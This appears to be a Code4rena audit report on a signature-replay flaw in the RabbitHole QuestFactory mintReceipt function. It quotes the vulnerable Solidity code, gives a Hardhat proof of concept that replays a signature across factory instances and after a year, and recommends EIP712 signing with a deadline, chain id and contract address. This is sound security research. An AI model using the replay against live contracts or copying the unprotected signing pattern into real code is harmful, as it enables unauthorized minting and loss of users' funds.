# Original link
https://github.com/code-423n4/2023-01-rabbithole-findings/issues/107
# Lines of code

https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/QuestFactory.sol#L219-L229


# Vulnerability details

## Impact
The `QuestFactory.mintReceipt` function mints `RabbitHoleReceipt` tokens based upon signatures signed by `claimSignerAddress`.
```solidity
    function mintReceipt(string memory questId_, bytes32 hash_, bytes memory signature_) public {
        if (quests[questId_].numberMinted + 1 > quests[questId_].totalParticipants) revert OverMaxAllowedToMint();
        if (quests[questId_].addressMinted[msg.sender] == true) revert AddressAlreadyMinted();
        if (keccak256(abi.encodePacked(msg.sender, questId_)) != hash_) revert InvalidHash();
        if (recoverSigner(hash_, signature_) != claimSignerAddress) revert AddressNotSigned();

        quests[questId_].addressMinted[msg.sender] = true;
        quests[questId_].numberMinted++;
        emit ReceiptMinted(msg.sender, questId_);
        rabbitholeReceiptContract.mint(msg.sender, questId_);
    }
```
In the above function only the account's address and quest id values are used to generate and validate the signature. 

This causes various issues which are mentioned below:

1. There is no deadline for the signatures. Once a signature is signed by `claimSignerAddress` that signature can be provided to `QuestFactory.mintReceipt` function to mint an RabbitholeReceipt token at any point in the future.

2. The signature can be replayed on other EVM compatible chains on which RabbitHole protocol is deployed. The [docs](https://github.com/rabbitholegg/quest-protocol/tree/8c4c1f71221570b14a0479c216583342bd652d8d#deployments) mention other EVM chain addresses of the contracts which means the protocol will be deployed on multiple chains.

3. The signature can be replayed on multiple instances of QuestFactory contract. If multiple QuestFactory contracts are deployed on a single EVM chain then signature intended for one contract can be replayed on the other ones.

Note that all these scenarios are true when `questId_` parameter stays same.

#### Actual Impact
Exploitation using the above mentioned scenarios will lead to unintended minting of RabbitholeReceipt token. This is a crucial token for the protocol which is also used to claim rewards from Quest contracts. Hence any unintentional minting will cause loss of funds.

## Proof of Concept
The test cases were added in `./test/QuestFactory.spec.ts` file and ran using command `npx hardhat test ./test/QuestFactory.spec.ts`.
```typescript
  describe.only('QuestFactory: Signature Replay Bug', () => {
    it('Signature can be used in different QuestFactory instance or on different chain', async () => {
      const randomUser = (await ethers.getSigners())[10];
      const questA = "A";

      // Sign message and create new Quest
      const messageHash = utils.solidityKeccak256(['address', 'string'], [randomUser.address.toLowerCase(), questA])
      const signature = await wallet.signMessage(utils.arrayify(messageHash))
      await deployedFactoryContract.setRewardAllowlistAddress(deployedSampleErc20Contract.address, true)
      await deployedFactoryContract.createQuest(
        deployedSampleErc20Contract.address, expiryDate, startDate, totalRewards, rewardAmount, 'erc20', questA
      )

      // Use the signature on First QuestFactory
      await deployedFactoryContract.connect(randomUser).mintReceipt(questA, messageHash, signature)
      expect(await deployedRabbitHoleReceiptContract.balanceOf(randomUser.address)).to.equal(1)

      const factoryPrevious = deployedFactoryContract
      const RHRPrevious = deployedRabbitHoleReceiptContract

      // Deploy a new QuestFactory (this could be on a different chain)
      await deployRabbitHoleReceiptContract()
      await deployFactoryContract()

      expect(factoryPrevious.address).to.not.eq(deployedFactoryContract.address)            // Verify we have new instance
      expect(RHRPrevious.address).to.not.eq(deployedRabbitHoleReceiptContract.address)

      // Create new Quest in new QuestFactory
      await deployedFactoryContract.setRewardAllowlistAddress(deployedSampleErc20Contract.address, true)
      await deployedFactoryContract.createQuest(
        deployedSampleErc20Contract.address, expiryDate, startDate, totalRewards, rewardAmount, 'erc20', questA
      )

      // Use the previously used signature again on new QuestFactory
      await deployedFactoryContract.connect(randomUser).mintReceipt(questA, messageHash, signature)
      expect(await deployedRabbitHoleReceiptContract.balanceOf(randomUser.address)).to.equal(1)
      expect(await RHRPrevious.balanceOf(randomUser.address)).to.equal(1)
    })

    it('Signature can be used after 1 year', async () => {
      const randomUser = (await ethers.getSigners())[10];
      const questA = "A";

      // Sign message and create new Quest
      const messageHash = utils.solidityKeccak256(['address', 'string'], [randomUser.address.toLowerCase(), questA])
      const signature = await wallet.signMessage(utils.arrayify(messageHash))
      await deployedFactoryContract.setRewardAllowlistAddress(deployedSampleErc20Contract.address, true)
      await deployedFactoryContract.createQuest(
        deployedSampleErc20Contract.address, expiryDate, startDate, totalRewards, rewardAmount, 'erc20', questA
      )

      // Move ahead 1 year
      await ethers.provider.send("evm_mine", [expiryDate + 31536000])

      // Use the signature
      await deployedFactoryContract.connect(randomUser).mintReceipt(questA, messageHash, signature)
      expect(await deployedRabbitHoleReceiptContract.balanceOf(randomUser.address)).to.equal(1)
    })
  })
```

## Tools Used
Hardhat

## Recommended Mitigation Steps
Consider including deadline, chainid and QuestFactory's address in the signature message. Ideally signatures should be created according to the [EIP712](https://eips.ethereum.org/EIPS/eip-712) standard.